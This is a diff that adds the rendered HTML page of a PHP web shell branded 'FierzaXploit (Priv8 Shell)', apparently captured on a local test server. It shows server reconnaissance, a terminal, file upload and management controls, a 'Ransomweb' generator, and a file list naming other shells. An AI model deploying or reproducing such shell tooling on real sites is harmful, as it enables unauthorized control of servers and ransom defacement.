@@ -1,0 +1,465 @@
+<!doctype html>
+<html id="up" lang="en">
+<head>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="Content-Type" content="image/jpeg; charset=utf-8">
+    <meta name="msapplication-TileImage" content="https://i.ibb.co/HGNQWNW/fococlipping-20211224-85315.png">
+
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <!-- Bootstrap CSS -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0-beta1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-0evHe/X+R7YkIZDRvuzKMRqM+OrBnVFBL6DOitfPri4tjfHxaWutUpFmBp4vmVor" crossorigin="anonymous">
+
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css"/>
+
+    <link href="https://unpkg.com/aos@2.3.1/dist/aos.css" rel="stylesheet">
+
+    <link rel="stylesheet" href="https://fierzaeriez.github.io/gayaku.min.css">
+    <script src="https://fierzaeriez.github.io/battery.js"></script>
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/styles/default.min.css">
+    <link rel="stylesheet" href="https://fierzaeriez.github.io/battery.min.css">
+
+</head>
+<body class="bg-dark animate__animated animate__fadeIn">
+    <div class="container-fluid">
+        <a href=".." class="fs-5 text-white text-decoration-none"><font size="5" color="white"><i class="bi bi-arrow-left-square-fill"></i></font> Back To Home</a>
+        <center><br><h3 data-aos="fade-up"
+        data-aos-anchor-placement="bottom-bottom" for="exampleFormControlInput1" class="mb-1 mt-1 text-white form-label judul-brand">- FierzaXploit(Priv8 Shell) -</h3><label data-aos="fade-down"
+        data-aos-easing="linear"
+        data-aos-duration="1500" class="mb-1 text-white">Simple,Responsive & Powerfull</label></center>
+        
+        <nav class="navbar navbar-expand-lg navbar-light bg-dark sticky-sm-top" data-aos="zoom-out-down">
+            <div class="container">
+                <p class="text-white"><i class="bi bi-check-circle"></i> Version : 1.5 (Priv8 Edition)</p>
+                <div class="btn-group tombol-batrei">
+                    <button class="btn btn-dark btn-sm dropdown-toggle" type="button" data-bs-toggle="dropdown" aria-expanded="false">
+                        <i id="baterainya"></i>
+                    </button>
+                    <ul class="dropdown-menu dropdown-menu-start">
+                    <li>
+                        <h5 class="geser">Battery :</h5>
+                        <center>
+                        <h5 id="batre"></h5>
+                        </center>
+                    </li>
+                    <hr>
+                    <li class="geser st">
+                        <div id="charging">(charging state unknown)</div>
+                        <div id="dischargingTime">(discharging time unknown)</div>
+                    </li>
+                    </ul>
+    
+                    <form method="POST">
+                        <button type="submit" name="logout" class="btn btn-dark btn-sm"><i class="bi bi-power"></i></button>
+                    </form>
+                </div>
+            </div>
+        </nav>
+    </div>
+    <div class="shell container-fluid">
+    <!-- list file/folder -->
+    <div class="container-fluid">
+        <div class="row">
+            <div class="">
+                
+            <a class="information-server text-decoration-none btn-md text-white text-start bg-dark" data-bs-toggle="collapse" href="#collapseExample" role="button" aria-expanded="false" aria-controls="collapseExample">
+                <p ><i class="bi bi-info-circle-fill"></i> Information Server <i class="bi bi-chevron-down"></i></p>
+            </a>
+            <div class="collapse" id="collapseExample">
+                <div class="card card-body bg-dark">
+                    <div class="text-white bg-dark tablenya ds">
+                            <ul class="">
+                                <li>Website : 127.0.0.1</li>
+                                <li>Ip Address : 127.0.0.1</li>
+                                <li>Port : 80</li>
+                                <li>Kernel : Windows NT FIERZA 10.0 build 19044 (Windows 10) AMD64</li>
+                                <li>Protokol : HTTP/1.1</li>
+                                <li>Save Data : </li>
+                                <li>Koneksi : keep-alive</li>
+                                <li>Server : Apache/2.4.51 (Win64) OpenSSL/1.1.1l PHP/8.0.13</li>
+                                <li>Root : C:/xampp/htdocs</li>
+                                <li>G-Interface : CGI/1.1</li>
+                                <li>R-Method : GET</li>
+                                                                <li>Browser : Google Chrome</li>
+                            </ul>
+                    </div>
+                </div>
+            </div>
+             <font color='white' class='ds fs-6'><b>[ + ]</b> DISABLE FUNCTION : </font><font color=gold>NONE</font><br><div class='ds fs-6 text-white coba'><b class='text-white'>[ + ]</b> MySQL: <label class='text-danger'> OFF </label> <b>||</b>  cURL: <label class='text-success'> ON </label> <b>||</b>  WGET: <label class='text-danger'> OFF </label> <b>||</b> Perl: <label class='text-danger'> OFF </label> <b>||</b>  Python: <label class='text-success'> ON </label> </div>        </div>
+
+        <font size='4'><b><p class='coba tulisan tablenya'><i size='15' class='pathnya bi bi-folder-symlink-fill'></i> : </b></font><a href="?path=C:" class="path ds">C:</a><i class="bi bi-chevron-right"></i><a href="?path=C:/xampp" class="path ds">xampp</a><i class="bi bi-chevron-right"></i><a href="?path=C:/xampp/htdocs" class="path ds">htdocs</a><i class="bi bi-chevron-right"></i><a href="?path=C:/xampp/htdocs/testpriv.php" class="path ds">testpriv.php</a><i class="bi bi-chevron-right"></i><br><a href="?" class="mt-2 linknya btn btn-light btn-sm"><i class="text-dark bi bi-house-door-fill"></i></a>
+
+        <!-- tambah file/folder & ransomweb -->
+        <div class="tambah">
+            <div class="container-fluid">
+                <center>
+                    <div class="row row-cols-4">
+                        <!-- tambah file -->
+                        <div class="col">
+                            <a class="path" href="?path=C:/xampp/htdocs/testpriv.php&aksi=buatfile"><font size="5"><i class="bi bi-file-earmark-plus-fill"></i></font> File</a>
+                        </div>
+                        <!-- akhir tambah file -->
+
+                        <!-- tambah folder -->
+                        <div class="col">
+                            <a class="path" href="?path=C:/xampp/htdocs/testpriv.php&aksi=buatfolder"><font size="5"><i class="bi bi-folder-plus"></i></font> Folder</a>
+                        </div>
+                        <!-- Akhir tambah folder -->
+
+                        <!-- terminal -->
+                        <div class="col">
+                            <a class="path" href="?path=C:/xampp/htdocs/testpriv.php&aksi=terminal"><font size="5"><i class="bi bi-terminal"></i></font> Terminal</a>
+                        </div>
+                        <!-- Akhir terminal -->
+
+                        <!-- auto create ransomweb -->
+                        <div class="col">
+                            <a class="path" href="?path=C:/xampp/htdocs/testpriv.php&aksi=buatransom"><font size="5"><i class="bi bi-file-earmark-lock2-fill"></i></font> Ransom<br>web</a>
+                        </div>
+                        <!-- akhir auto create ransomweb -->
+                    </div>
+                </center>
+            </div>
+        </div>
+        <!-- akhir tambah file/folder & ransomweb -->
+
+        <div class="container-fluid mt-2 mb-2">
+            <form method="post" enctype="multipart/form-data">
+                <div class="uploader file input-group input-group-sm ms-auto">
+                    <input type="file" name="upl[]" id="upload" class="input-group-text form-control bg-dark text-white" id="inputGroupFile04" aria-describedby="inputGroupFileAddon04" aria-label="Upload" multiple>
+                    <button name="btn" class="btn btn-outline-light" type="submit" id="inputGroupFileAddon04"><i class="bi bi-cloud-upload-fill"></i> Upload</button>
+                </div>
+            </form>	
+        </div>    <br>
+        <div class="table-responsive-lg mt-3">
+        <table class="table table-dark table-hover table-sm align-middle table-striped">
+            <thead>
+                <tr>
+                    <th scope="col"><b><i class="bi bi-bookmark-check-fill"></i></b></th>
+                    <th scope="col">Type</th>
+                    <th scope="col">Name</th>
+                    <th scope="col">Size</th>
+                    <th scope="col">Last Modified</th>
+                    <th scope="col">Permission</th>
+                    <th scope="col">options</th>
+                </tr>
+            </thead>
+            <tbody class="table-group-divider">
+            <form method="POST">
+                <tr>
+                                <th scope="row"><div class="form-check">
+                                <input name='daftarku[]' value='adminer-4.8.1.php' class="form-check-input" type="checkbox" value="1" id="flexCheckIndeterminate">
+                                </div></th>
+                                <td><font size='5'><i class="bi bi-filetype-php"></i></font></td>
+                                <td>
+                                <a class="path" nama='filenya' href="?path=C:/xampp/htdocs/testpriv.php&aksi=view&path_file=C:/xampp/htdocs/testpriv.php/adminer-4.8.1.php">adminer-4.8.1.php</a>
+                                </td>
+                                <td>465.43 KB</td>
+                                <td>07 May 2022 04:22:24</td>
+                                <td><font color="#2EFF00">-rw-rw-rw-</font></td>
+                                <td>
+                                    <a href='?path=C:/xampp/htdocs/testpriv.php&aksi=edit&dirf=C:/xampp/htdocs/testpriv.php/adminer-4.8.1.php&nama_file=adminer-4.8.1.php' class="btn btn-outline-success" data-bs-toggle="tooltip" data-bs-placement="top" title="Edit File"><i class="bi bi-pencil-square"></i></a>
+                                    <a href='?path=C:/xampp/htdocs/testpriv.php&aksi=rename&dirf=C:/xampp/htdocs/testpriv.php/adminer-4.8.1.php&nama_file=adminer-4.8.1.php' class="btn btn-outline-warning" data-bs-toggle="tooltip" data-bs-placement="top" title="Rename File"><i class="bi bi-pencil"></i></a>
+                                    <a href='?path=C:/xampp/htdocs/testpriv.php&aksi=chmod&dirf=C:/xampp/htdocs/testpriv.php/adminer-4.8.1.php&nama_file=adminer-4.8.1.php' class="btn btn-outline-light"><i class="bi bi-cursor-fill" data-bs-toggle="tooltip" data-bs-placement="top" title="Chmod File"></i></a>
+                                    <a href='?path=C:/xampp/htdocs/testpriv.php&aksi=delete&dirf=C:/xampp/htdocs/testpriv.php/adminer-4.8.1.php&nama_file=adminer-4.8.1.php' class="btn btn-outline-danger"><i class="bi bi-trash-fill" data-bs-toggle="tooltip" data-bs-placement="top" title="Delete File"></i></a>
+                                </td>
+                            </tr><tr>
+                                <th scope="row"><div class="form-check">
+                                <input name='daftarku[]' value='asp-shell.aspx' class="form-check-input" type="checkbox" value="1" id="flexCheckIndeterminate">
+                                </div></th>
+                                <td><font size='5'><i class="bi bi-filetype-doc"></i></font></td>
+                                <td>
+                                <a class="path" nama='filenya' href="?path=C:/xampp/htdocs/testpriv.php&aksi=view&path_file=C:/xampp/htdocs/testpriv.php/asp-shell.aspx">asp-shell.aspx</a>
+                                </td>
+                                <td>149.02 KB</td>
+                                <td>18 May 2022 21:22:35</td>
+                                <td><font color="#2EFF00">-rw-rw-rw-</font></td>
+                                <td>
+                                    <a href='?path=C:/xampp/htdocs/testpriv.php&aksi=edit&dirf=C:/xampp/htdocs/testpriv.php/asp-shell.aspx&nama_file=asp-shell.aspx' class="btn btn-outline-success" data-bs-toggle="tooltip" data-bs-placement="top" title="Edit File"><i class="bi bi-pencil-square"></i></a>
+                                    <a href='?path=C:/xampp/htdocs/testpriv.php&aksi=rename&dirf=C:/xampp/htdocs/testpriv.php/asp-shell.aspx&nama_file=asp-shell.aspx' class="btn btn-outline-warning" data-bs-toggle="tooltip" data-bs-placement="top" title="Rename File"><i class="bi bi-pencil"></i></a>
+                                    <a href='?path=C:/xampp/htdocs/testpriv.php&aksi=chmod&dirf=C:/xampp/htdocs/testpriv.php/asp-shell.aspx&nama_file=asp-shell.aspx' class="btn btn-outline-light"><i class="bi bi-cursor-fill" data-bs-toggle="tooltip" data-bs-placement="top" title="Chmod File"></i></a>
+                                    <a href='?path=C:/xampp/htdocs/testpriv.php&aksi=delete&dirf=C:/xampp/htdocs/testpriv.php/asp-shell.aspx&nama_file=asp-shell.aspx' class="btn btn-outline-danger"><i class="bi bi-trash-fill" data-bs-toggle="tooltip" data-bs-placement="top" title="Delete File"></i></a>
+                                </td>
+                            </tr><tr>
+                                <th scope="row"><div class="form-check">
+                                <input name='daftarku[]' value='bc.php' class="form-check-input" type="checkbox" value="1" id="flexCheckIndeterminate">
+                                </div></th>
+                                <td><font size='5'><i class="bi bi-filetype-php"></i></font></td>
+                                <td>
+                                <a class="path" nama='filenya' href="?path=C:/xampp/htdocs/testpriv.php&aksi=view&path_file=C:/xampp/htdocs/testpriv.php/bc.php">bc.php</a>
+                                </td>
+                                <td>234 B</td>
+                                <td>24 May 2022 06:44:33</td>
+                                <td><font color="#2EFF00">-rw-rw-rw-</font></td>
+                                <td>
+                                    <a href='?path=C:/xampp/htdocs/testpriv.php&aksi=edit&dirf=C:/xampp/htdocs/testpriv.php/bc.php&nama_file=bc.php' class="btn btn-outline-success" data-bs-toggle="tooltip" data-bs-placement="top" title="Edit File"><i class="bi bi-pencil-square"></i></a>
+                                    <a href='?path=C:/xampp/htdocs/testpriv.php&aksi=rename&dirf=C:/xampp/htdocs/testpriv.php/bc.php&nama_file=bc.php' class="btn btn-outline-warning" data-bs-toggle="tooltip" data-bs-placement="top" title="Rename File"><i class="bi bi-pencil"></i></a>
+                                    <a href='?path=C:/xampp/htdocs/testpriv.php&aksi=chmod&dirf=C:/xampp/htdocs/testpriv.php/bc.php&nama_file=bc.php' class="btn btn-outline-light"><i class="bi bi-cursor-fill" data-bs-toggle="tooltip" data-bs-placement="top" title="Chmod File"></i></a>
+                                    <a href='?path=C:/xampp/htdocs/testpriv.php&aksi=delete&dirf=C:/xampp/htdocs/testpriv.php/bc.php&nama_file=bc.php' class="btn btn-outline-danger"><i class="bi bi-trash-fill" data-bs-toggle="tooltip" data-bs-placement="top" title="Delete File"></i></a>
+                                </td>
+                            </tr><tr>
+                                <th scope="row"><div class="form-check">
+                                <input name='daftarku[]' value='coba.html' class="form-check-input" type="checkbox" value="1" id="flexCheckIndeterminate">
+                                </div></th>
+                                <td><font size='5'><i class="bi bi-filetype-html"></i></font></td>
+                                <td>
+                                <a class="path" nama='filenya' href="?path=C:/xampp/htdocs/testpriv.php&aksi=view&path_file=C:/xampp/htdocs/testpriv.php/coba.html">coba.html</a>
+                                </td>
+                                <td>772 B</td>
+                                <td>27 May 2022 20:41:44</td>
+                                <td><font color="#2EFF00">-rw-rw-rw-</font></td>
+                                <td>
+                                    <a href='?path=C:/xampp/htdocs/testpriv.php&aksi=edit&dirf=C:/xampp/htdocs/testpriv.php/coba.html&nama_file=coba.html' class="btn btn-outline-success" data-bs-toggle="tooltip" data-bs-placement="top" title="Edit File"><i class="bi bi-pencil-square"></i></a>
+                                    <a href='?path=C:/xampp/htdocs/testpriv.php&aksi=rename&dirf=C:/xampp/htdocs/testpriv.php/coba.html&nama_file=coba.html' class="btn btn-outline-warning" data-bs-toggle="tooltip" data-bs-placement="top" title="Rename File"><i class="bi bi-pencil"></i></a>
+                                    <a href='?path=C:/xampp/htdocs/testpriv.php&aksi=chmod&dirf=C:/xampp/htdocs/testpriv.php/coba.html&nama_file=coba.html' class="btn btn-outline-light"><i class="bi bi-cursor-fill" data-bs-toggle="tooltip" data-bs-placement="top" title="Chmod File"></i></a>
+                                    <a href='?path=C:/xampp/htdocs/testpriv.php&aksi=delete&dirf=C:/xampp/htdocs/testpriv.php/coba.html&nama_file=coba.html' class="btn btn-outline-danger"><i class="bi bi-trash-fill" data-bs-toggle="tooltip" data-bs-placement="top" title="Delete File"></i></a>
+                                </td>
+                            </tr><tr>
+                                <th scope="row"><div class="form-check">
+                                <input name='daftarku[]' value='connector.php-dist' class="form-check-input" type="checkbox" value="1" id="flexCheckIndeterminate">
+                                </div></th>
+                                <td><font size='5'><i class="bi bi-filetype-doc"></i></font></td>
+                                <td>
+                                <a class="path" nama='filenya' href="?path=C:/xampp/htdocs/testpriv.php&aksi=view&path_file=C:/xampp/htdocs/testpriv.php/connector.php-dist">connector.php-dist</a>
+                                </td>
+                                <td>3 KB</td>
+                                <td>26 May 2022 07:50:19</td>
+                                <td><font color="#2EFF00">-rw-rw-rw-</font></td>
+                                <td>
+                                    <a href='?path=C:/xampp/htdocs/testpriv.php&aksi=edit&dirf=C:/xampp/htdocs/testpriv.php/connector.php-dist&nama_file=connector.php-dist' class="btn btn-outline-success" data-bs-toggle="tooltip" data-bs-placement="top" title="Edit File"><i class="bi bi-pencil-square"></i></a>
+                                    <a href='?path=C:/xampp/htdocs/testpriv.php&aksi=rename&dirf=C:/xampp/htdocs/testpriv.php/connector.php-dist&nama_file=connector.php-dist' class="btn btn-outline-warning" data-bs-toggle="tooltip" data-bs-placement="top" title="Rename File"><i class="bi bi-pencil"></i></a>
+                                    <a href='?path=C:/xampp/htdocs/testpriv.php&aksi=chmod&dirf=C:/xampp/htdocs/testpriv.php/connector.php-dist&nama_file=connector.php-dist' class="btn btn-outline-light"><i class="bi bi-cursor-fill" data-bs-toggle="tooltip" data-bs-placement="top" title="Chmod File"></i></a>
+                                    <a href='?path=C:/xampp/htdocs/testpriv.php&aksi=delete&dirf=C:/xampp/htdocs/testpriv.php/connector.php-dist&nama_file=connector.php-dist' class="btn btn-outline-danger"><i class="bi bi-trash-fill" data-bs-toggle="tooltip" data-bs-placement="top" title="Delete File"></i></a>
+                                </td>
+                            </tr><tr>
+                                <th scope="row"><div class="form-check">
+                                <input name='daftarku[]' value='encoded.php' class="form-check-input" type="checkbox" value="1" id="flexCheckIndeterminate">
+                                </div></th>
+                                <td><font size='5'><i class="bi bi-filetype-php"></i></font></td>
+                                <td>
+                                <a class="path" nama='filenya' href="?path=C:/xampp/htdocs/testpriv.php&aksi=view&path_file=C:/xampp/htdocs/testpriv.php/encoded.php">encoded.php</a>
+                                </td>
+                                <td>2.27 KB</td>
+                                <td>24 May 2022 07:37:46</td>
+                                <td><font color="#2EFF00">-rw-rw-rw-</font></td>
+                                <td>
+                                    <a href='?path=C:/xampp/htdocs/testpriv.php&aksi=edit&dirf=C:/xampp/htdocs/testpriv.php/encoded.php&nama_file=encoded.php' class="btn btn-outline-success" data-bs-toggle="tooltip" data-bs-placement="top" title="Edit File"><i class="bi bi-pencil-square"></i></a>
+                                    <a href='?path=C:/xampp/htdocs/testpriv.php&aksi=rename&dirf=C:/xampp/htdocs/testpriv.php/encoded.php&nama_file=encoded.php' class="btn btn-outline-warning" data-bs-toggle="tooltip" data-bs-placement="top" title="Rename File"><i class="bi bi-pencil"></i></a>
+                                    <a href='?path=C:/xampp/htdocs/testpriv.php&aksi=chmod&dirf=C:/xampp/htdocs/testpriv.php/encoded.php&nama_file=encoded.php' class="btn btn-outline-light"><i class="bi bi-cursor-fill" data-bs-toggle="tooltip" data-bs-placement="top" title="Chmod File"></i></a>
+                                    <a href='?path=C:/xampp/htdocs/testpriv.php&aksi=delete&dirf=C:/xampp/htdocs/testpriv.php/encoded.php&nama_file=encoded.php' class="btn btn-outline-danger"><i class="bi bi-trash-fill" data-bs-toggle="tooltip" data-bs-placement="top" title="Delete File"></i></a>
+                                </td>
+                            </tr><tr>
+                                <th scope="row"><div class="form-check">
+                                <input name='daftarku[]' value='hhh.php' class="form-check-input" type="checkbox" value="1" id="flexCheckIndeterminate">
+                                </div></th>
+                                <td><font size='5'><i class="bi bi-filetype-php"></i></font></td>
+                                <td>
+                                <a class="path" nama='filenya' href="?path=C:/xampp/htdocs/testpriv.php&aksi=view&path_file=C:/xampp/htdocs/testpriv.php/hhh.php">hhh.php</a>
+                                </td>
+                                <td>140 B</td>
+                                <td>24 May 2022 02:25:33</td>
+                                <td><font color="#2EFF00">-rw-rw-rw-</font></td>
+                                <td>
+                                    <a href='?path=C:/xampp/htdocs/testpriv.php&aksi=edit&dirf=C:/xampp/htdocs/testpriv.php/hhh.php&nama_file=hhh.php' class="btn btn-outline-success" data-bs-toggle="tooltip" data-bs-placement="top" title="Edit File"><i class="bi bi-pencil-square"></i></a>
+                                    <a href='?path=C:/xampp/htdocs/testpriv.php&aksi=rename&dirf=C:/xampp/htdocs/testpriv.php/hhh.php&nama_file=hhh.php' class="btn btn-outline-warning" data-bs-toggle="tooltip" data-bs-placement="top" title="Rename File"><i class="bi bi-pencil"></i></a>
+                                    <a href='?path=C:/xampp/htdocs/testpriv.php&aksi=chmod&dirf=C:/xampp/htdocs/testpriv.php/hhh.php&nama_file=hhh.php' class="btn btn-outline-light"><i class="bi bi-cursor-fill" data-bs-toggle="tooltip" data-bs-placement="top" title="Chmod File"></i></a>
+                                    <a href='?path=C:/xampp/htdocs/testpriv.php&aksi=delete&dirf=C:/xampp/htdocs/testpriv.php/hhh.php&nama_file=hhh.php' class="btn btn-outline-danger"><i class="bi bi-trash-fill" data-bs-toggle="tooltip" data-bs-placement="top" title="Delete File"></i></a>
+                                </td>
+                            </tr><tr>
+                                <th scope="row"><div class="form-check">
+                                <input name='daftarku[]' value='marjun.php.PhP' class="form-check-input" type="checkbox" value="1" id="flexCheckIndeterminate">
+                                </div></th>
+                                <td><font size='5'><i class="bi bi-filetype-php"></i></font></td>
+                                <td>
+                                <a class="path" nama='filenya' href="?path=C:/xampp/htdocs/testpriv.php&aksi=view&path_file=C:/xampp/htdocs/testpriv.php/marjun.php.PhP">marjun.php.PhP</a>
+                                </td>
+                                <td>72.51 KB</td>
+                                <td>24 May 2022 02:39:25</td>
+                                <td><font color="#2EFF00">-rw-rw-rw-</font></td>
+                                <td>
+                                    <a href='?path=C:/xampp/htdocs/testpriv.php&aksi=edit&dirf=C:/xampp/htdocs/testpriv.php/marjun.php.PhP&nama_file=marjun.php.PhP' class="btn btn-outline-success" data-bs-toggle="tooltip" data-bs-placement="top" title="Edit File"><i class="bi bi-pencil-square"></i></a>
+                                    <a href='?path=C:/xampp/htdocs/testpriv.php&aksi=rename&dirf=C:/xampp/htdocs/testpriv.php/marjun.php.PhP&nama_file=marjun.php.PhP' class="btn btn-outline-warning" data-bs-toggle="tooltip" data-bs-placement="top" title="Rename File"><i class="bi bi-pencil"></i></a>
+                                    <a href='?path=C:/xampp/htdocs/testpriv.php&aksi=chmod&dirf=C:/xampp/htdocs/testpriv.php/marjun.php.PhP&nama_file=marjun.php.PhP' class="btn btn-outline-light"><i class="bi bi-cursor-fill" data-bs-toggle="tooltip" data-bs-placement="top" title="Chmod File"></i></a>
+                                    <a href='?path=C:/xampp/htdocs/testpriv.php&aksi=delete&dirf=C:/xampp/htdocs/testpriv.php/marjun.php.PhP&nama_file=marjun.php.PhP' class="btn btn-outline-danger"><i class="bi bi-trash-fill" data-bs-toggle="tooltip" data-bs-placement="top" title="Delete File"></i></a>
+                                </td>
+                            </tr><tr>
+                                <th scope="row"><div class="form-check">
+                                <input name='daftarku[]' value='priv8.php' class="form-check-input" type="checkbox" value="1" id="flexCheckIndeterminate">
+                                </div></th>
+                                <td><font size='5'><i class="bi bi-filetype-php"></i></font></td>
+                                <td>
+                                <a class="path" nama='filenya' href="?path=C:/xampp/htdocs/testpriv.php&aksi=view&path_file=C:/xampp/htdocs/testpriv.php/priv8.php">priv8.php</a>
+                                </td>
+                                <td>51.72 KB</td>
+                                <td>22 May 2022 23:55:57</td>
+                                <td><font color="#2EFF00">-rw-rw-rw-</font></td>
+                                <td>
+                                    <a href='?path=C:/xampp/htdocs/testpriv.php&aksi=edit&dirf=C:/xampp/htdocs/testpriv.php/priv8.php&nama_file=priv8.php' class="btn btn-outline-success" data-bs-toggle="tooltip" data-bs-placement="top" title="Edit File"><i class="bi bi-pencil-square"></i></a>
+                                    <a href='?path=C:/xampp/htdocs/testpriv.php&aksi=rename&dirf=C:/xampp/htdocs/testpriv.php/priv8.php&nama_file=priv8.php' class="btn btn-outline-warning" data-bs-toggle="tooltip" data-bs-placement="top" title="Rename File"><i class="bi bi-pencil"></i></a>
+                                    <a href='?path=C:/xampp/htdocs/testpriv.php&aksi=chmod&dirf=C:/xampp/htdocs/testpriv.php/priv8.php&nama_file=priv8.php' class="btn btn-outline-light"><i class="bi bi-cursor-fill" data-bs-toggle="tooltip" data-bs-placement="top" title="Chmod File"></i></a>
+                                    <a href='?path=C:/xampp/htdocs/testpriv.php&aksi=delete&dirf=C:/xampp/htdocs/testpriv.php/priv8.php&nama_file=priv8.php' class="btn btn-outline-danger"><i class="bi bi-trash-fill" data-bs-toggle="tooltip" data-bs-placement="top" title="Delete File"></i></a>
+                                </td>
+                            </tr><tr>
+                                <th scope="row"><div class="form-check">
+                                <input name='daftarku[]' value='rs.php' class="form-check-input" type="checkbox" value="1" id="flexCheckIndeterminate">
+                                </div></th>
+                                <td><font size='5'><i class="bi bi-filetype-php"></i></font></td>
+                                <td>
+                                <a class="path" nama='filenya' href="?path=C:/xampp/htdocs/testpriv.php&aksi=view&path_file=C:/xampp/htdocs/testpriv.php/rs.php">rs.php</a>
+                                </td>
+                                <td>53.85 KB</td>
+                                <td>19 May 2022 04:17:23</td>
+                                <td><font color="#2EFF00">-rw-rw-rw-</font></td>
+                                <td>
+                                    <a href='?path=C:/xampp/htdocs/testpriv.php&aksi=edit&dirf=C:/xampp/htdocs/testpriv.php/rs.php&nama_file=rs.php' class="btn btn-outline-success" data-bs-toggle="tooltip" data-bs-placement="top" title="Edit File"><i class="bi bi-pencil-square"></i></a>
+                                    <a href='?path=C:/xampp/htdocs/testpriv.php&aksi=rename&dirf=C:/xampp/htdocs/testpriv.php/rs.php&nama_file=rs.php' class="btn btn-outline-warning" data-bs-toggle="tooltip" data-bs-placement="top" title="Rename File"><i class="bi bi-pencil"></i></a>
+                                    <a href='?path=C:/xampp/htdocs/testpriv.php&aksi=chmod&dirf=C:/xampp/htdocs/testpriv.php/rs.php&nama_file=rs.php' class="btn btn-outline-light"><i class="bi bi-cursor-fill" data-bs-toggle="tooltip" data-bs-placement="top" title="Chmod File"></i></a>
+                                    <a href='?path=C:/xampp/htdocs/testpriv.php&aksi=delete&dirf=C:/xampp/htdocs/testpriv.php/rs.php&nama_file=rs.php' class="btn btn-outline-danger"><i class="bi bi-trash-fill" data-bs-toggle="tooltip" data-bs-placement="top" title="Delete File"></i></a>
+                                </td>
+                            </tr><tr>
+                                <th scope="row"><div class="form-check">
+                                <input name='daftarku[]' value='t.php' class="form-check-input" type="checkbox" value="1" id="flexCheckIndeterminate">
+                                </div></th>
+                                <td><font size='5'><i class="bi bi-filetype-php"></i></font></td>
+                                <td>
+                                <a class="path" nama='filenya' href="?path=C:/xampp/htdocs/testpriv.php&aksi=view&path_file=C:/xampp/htdocs/testpriv.php/t.php">t.php</a>
+                                </td>
+                                <td>7.15 KB</td>
+                                <td>22 May 2022 23:55:01</td>
+                                <td><font color="#2EFF00">-rw-rw-rw-</font></td>
+                                <td>
+                                    <a href='?path=C:/xampp/htdocs/testpriv.php&aksi=edit&dirf=C:/xampp/htdocs/testpriv.php/t.php&nama_file=t.php' class="btn btn-outline-success" data-bs-toggle="tooltip" data-bs-placement="top" title="Edit File"><i class="bi bi-pencil-square"></i></a>
+                                    <a href='?path=C:/xampp/htdocs/testpriv.php&aksi=rename&dirf=C:/xampp/htdocs/testpriv.php/t.php&nama_file=t.php' class="btn btn-outline-warning" data-bs-toggle="tooltip" data-bs-placement="top" title="Rename File"><i class="bi bi-pencil"></i></a>
+                                    <a href='?path=C:/xampp/htdocs/testpriv.php&aksi=chmod&dirf=C:/xampp/htdocs/testpriv.php/t.php&nama_file=t.php' class="btn btn-outline-light"><i class="bi bi-cursor-fill" data-bs-toggle="tooltip" data-bs-placement="top" title="Chmod File"></i></a>
+                                    <a href='?path=C:/xampp/htdocs/testpriv.php&aksi=delete&dirf=C:/xampp/htdocs/testpriv.php/t.php&nama_file=t.php' class="btn btn-outline-danger"><i class="bi bi-trash-fill" data-bs-toggle="tooltip" data-bs-placement="top" title="Delete File"></i></a>
+                                </td>
+                            </tr><tr>
+                                <th scope="row"><div class="form-check">
+                                <input name='daftarku[]' value='test.php' class="form-check-input" type="checkbox" value="1" id="flexCheckIndeterminate">
+                                </div></th>
+                                <td><font size='5'><i class="bi bi-filetype-php"></i></font></td>
+                                <td>
+                                <a class="path" nama='filenya' href="?path=C:/xampp/htdocs/testpriv.php&aksi=view&path_file=C:/xampp/htdocs/testpriv.php/test.php">test.php</a>
+                                </td>
+                                <td>2.03 KB</td>
+                                <td>05 May 2022 06:45:18</td>
+                                <td><font color="#2EFF00">-rw-rw-rw-</font></td>
+                                <td>
+                                    <a href='?path=C:/xampp/htdocs/testpriv.php&aksi=edit&dirf=C:/xampp/htdocs/testpriv.php/test.php&nama_file=test.php' class="btn btn-outline-success" data-bs-toggle="tooltip" data-bs-placement="top" title="Edit File"><i class="bi bi-pencil-square"></i></a>
+                                    <a href='?path=C:/xampp/htdocs/testpriv.php&aksi=rename&dirf=C:/xampp/htdocs/testpriv.php/test.php&nama_file=test.php' class="btn btn-outline-warning" data-bs-toggle="tooltip" data-bs-placement="top" title="Rename File"><i class="bi bi-pencil"></i></a>
+                                    <a href='?path=C:/xampp/htdocs/testpriv.php&aksi=chmod&dirf=C:/xampp/htdocs/testpriv.php/test.php&nama_file=test.php' class="btn btn-outline-light"><i class="bi bi-cursor-fill" data-bs-toggle="tooltip" data-bs-placement="top" title="Chmod File"></i></a>
+                                    <a href='?path=C:/xampp/htdocs/testpriv.php&aksi=delete&dirf=C:/xampp/htdocs/testpriv.php/test.php&nama_file=test.php' class="btn btn-outline-danger"><i class="bi bi-trash-fill" data-bs-toggle="tooltip" data-bs-placement="top" title="Delete File"></i></a>
+                                </td>
+                            </tr><tr>
+                                <th scope="row"><div class="form-check">
+                                <input name='daftarku[]' value='v3.php' class="form-check-input" type="checkbox" value="1" id="flexCheckIndeterminate">
+                                </div></th>
+                                <td><font size='5'><i class="bi bi-filetype-php"></i></font></td>
+                                <td>
+                                <a class="path" nama='filenya' href="?path=C:/xampp/htdocs/testpriv.php&aksi=view&path_file=C:/xampp/htdocs/testpriv.php/v3.php">v3.php</a>
+                                </td>
+                                <td>51.72 KB</td>
+                                <td>27 May 2022 20:02:23</td>
+                                <td><font color="#2EFF00">-rw-rw-rw-</font></td>
+                                <td>
+                                    <a href='?path=C:/xampp/htdocs/testpriv.php&aksi=edit&dirf=C:/xampp/htdocs/testpriv.php/v3.php&nama_file=v3.php' class="btn btn-outline-success" data-bs-toggle="tooltip" data-bs-placement="top" title="Edit File"><i class="bi bi-pencil-square"></i></a>
+                                    <a href='?path=C:/xampp/htdocs/testpriv.php&aksi=rename&dirf=C:/xampp/htdocs/testpriv.php/v3.php&nama_file=v3.php' class="btn btn-outline-warning" data-bs-toggle="tooltip" data-bs-placement="top" title="Rename File"><i class="bi bi-pencil"></i></a>
